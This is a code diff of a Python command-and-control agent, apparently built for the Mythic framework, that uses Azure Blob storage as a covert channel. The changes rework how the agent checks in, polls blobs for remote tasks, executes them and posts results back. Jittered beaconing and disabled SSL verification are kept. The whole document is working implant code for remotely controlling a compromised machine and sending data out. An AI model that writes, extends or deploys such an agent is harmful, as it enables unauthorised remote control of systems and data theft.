@@ -36,7 +36,6 @@ class AzureBlobAgent:
         self.callback_interval = CALLBACK_INTERVAL
         self.callback_jitter = CALLBACK_JITTER
         self.checked_in = False
-        self.issued_checkin = False
 
         # Disable SSL verification for testing (remove in production)
         self.ssl_context = ssl.create_default_context()
@@ -67,24 +66,6 @@ class AzureBlobAgent:
             print(f"[!] PUT blob error: {e}")
             return False
 
-    def delete_blob(self, blob_path: str) -> bool:
-        """delete a data blob"""
-        url = self.get_blob_url(blob_path)
-        try:
-            req = urllib.request.Request(
-                url,
-                method="DELETE",
-                headers={
-                    "x-ms-blob-type": "BlockBlob",
-                    "Content-Type": "application/octet-stream",
-                }
-            )
-            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
-                return resp.status in (200, 201)
-        except Exception as e:
-            print(f"[!] DELETE blob error: {e}")
-            return False
-
     def get_blob(self, blob_path: str) -> bytes:
         """Download blob data"""
         url = self.get_blob_url(blob_path)
@@ -101,7 +82,7 @@ class AzureBlobAgent:
             print(f"[!] GET blob error: {e}")
             return b""
 
-    def build_checkin_message(self) -> str:
+    def get_checkin_data(self) -> str:
         """Build checkin message for Mythic"""
         return self.uuid + json.dumps({
             "action": "checkin",
@@ -131,44 +112,42 @@ class AzureBlobAgent:
     def checkin(self) -> bool:
         """Perform initial checkin"""
         print(f"[*] Checking in as {self.uuid}")
-        checkin_data = self.build_checkin_message()
+        checkin_data = self.get_checkin_data()
         encoded = base64.b64encode(checkin_data.encode()).decode()
 
         # Write checkin blob
-        if self.put_blob("ats/message.blob", encoded.encode()):
+        if self.put_blob("checkin.blob", encoded.encode()):
             print("[+] Checkin blob written")
+            self.checked_in = True
             return True
         else:
             print("[-] Failed to write checkin blob")
             return False
 
-    def get_sta_message(self) -> dict:
+    def get_tasking(self) -> list:
         """Get pending tasks from server"""
-        data = self.get_blob("sta/message.blob")
+        data = self.get_blob("tasking/pending.blob")
         if not data:
-            return {}
+            return []
 
         try:
             decoded = base64.b64decode(data).decode()
-            data = json.loads(decoded[36:])  # Skip UUID prefix
-            print(f"[*] Received sta message: {decoded}")
-            #self.delete_blob("sta/message.blob")
-            return data
+            tasking = json.loads(decoded[36:])  # Skip UUID prefix
+            return tasking.get("tasks", [])
         except Exception as e:
             print(f"[!] Failed to parse tasking: {e}")
-            return {}
+            return []
 
-    def post_ats_message(self, response_data: list[dict]) -> bool:
+    def post_response(self, task_id: str, response_data: dict) -> bool:
         """Post task response to server"""
         response = {
-            "action": "get_tasking",
-            "tasking_size": 1,
-            "responses": response_data if response_data else None,
+            "action": "post_response",
+            "responses": [response_data]
         }
-        encoded = base64.b64encode((self.uuid + json.dumps(response)).encode())
+        encoded = base64.b64encode(json.dumps(response).encode()).decode()
 
-        blob_name = f"ats/message.blob"
-        return self.put_blob(blob_name, encoded)
+        blob_name = f"response/{task_id}.blob"
+        return self.put_blob(blob_name, encoded.encode())
 
     def execute_task(self, task: dict) -> dict:
         """Execute a task and return response"""
@@ -209,7 +188,7 @@ class AzureBlobAgent:
 
             elif command == "exit":
                 response["user_output"] = "Agent exiting..."
-                self.post_ats_message(response)
+                self.post_response(task_id, response)
                 sys.exit(0)
 
             else:
@@ -238,53 +217,33 @@ class AzureBlobAgent:
 
         # Initial checkin
         while not self.checked_in:
-            if not self.issued_checkin:
-                if not self.checkin():
-                    print(f"[*] Retrying checkin in {self.get_sleep_time()} seconds...")
-                    time.sleep(self.get_sleep_time())
-                    continue
-                else:
-                    self.issued_checkin = True
-                    time.sleep(self.get_sleep_time())
-                    continue
-            data = self.get_sta_message()
-            if "action" in data and data["action"] == "checkin" and "status" in data:
-                if data["status"] == "success":
-                    self.checked_in = True
-                    self.uuid = data["id"]
-                    print(f"[+] new UUID: {self.uuid}")
-                    break
-            else:
-                time.sleep(self.get_sleep_time())
-                continue
+            if self.checkin():
+                break
+            print("[*] Retrying checkin in 5 seconds...")
+            time.sleep(5)
 
         # Main loop
-        print("[*] starting main loop")
-        self.post_ats_message(None)
         while True:
             try:
                 # Get tasking
-                data = self.get_sta_message()
-                response_data = None
-                if "tasks" in data:
-                    print("{*] got tasks")
-                    response_data = []
-                    for task in data["tasks"]:
-                        # Execute task
-                        response = self.execute_task(task)
-                        response_data.append(response)
-                # Post response
-                if self.post_ats_message(response_data):
-                    print(f"[+] Response posted")
-                else:
-                    print(f"[-] Failed to post response")
-                time.sleep(self.get_sleep_time())
+                tasks = self.get_tasking()
+
+                for task in tasks:
+                    # Execute task
+                    response = self.execute_task(task)
+
+                    # Post response
+                    if self.post_response(task["id"], response):
+                        print(f"[+] Response posted for task {task['id']}")
+                    else:
+                        print(f"[-] Failed to post response for task {task['id']}")
 
             except Exception as e:
                 print(f"[!] Main loop error: {e}")
 
             # Sleep with jitter
-            time.sleep(self.get_sleep_time())
+            sleep_time = self.get_sleep_time()
+            time.sleep(sleep_time)
 
 
 if __name__ == "__main__":
